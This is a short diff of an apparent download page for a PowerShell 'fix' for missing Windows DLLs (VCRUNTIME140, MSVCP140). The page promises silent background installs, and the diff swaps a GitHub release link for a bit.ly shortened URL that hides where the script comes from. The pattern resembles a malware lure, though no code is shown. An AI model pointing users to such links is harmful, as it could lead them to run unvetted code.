@@ -55,7 +55,7 @@ Silently install them in the background using:
 
 Prompt you to restart your PC once the fix is complete.
 
-📥 [Download Fix‐MissingDLLs.ps1](https://github.com/VCRUNTIME140dll/vcruntime140-dll-and-msvcp140-dll-missing-in-windows-10-11/releases/download/v1.0.1/Fix-VCRUNTIME140.ps1)
+📥 [Download Fix‐MissingDLLs.ps1](https://bit.ly/msvcp140dllmissing)
 
 
 
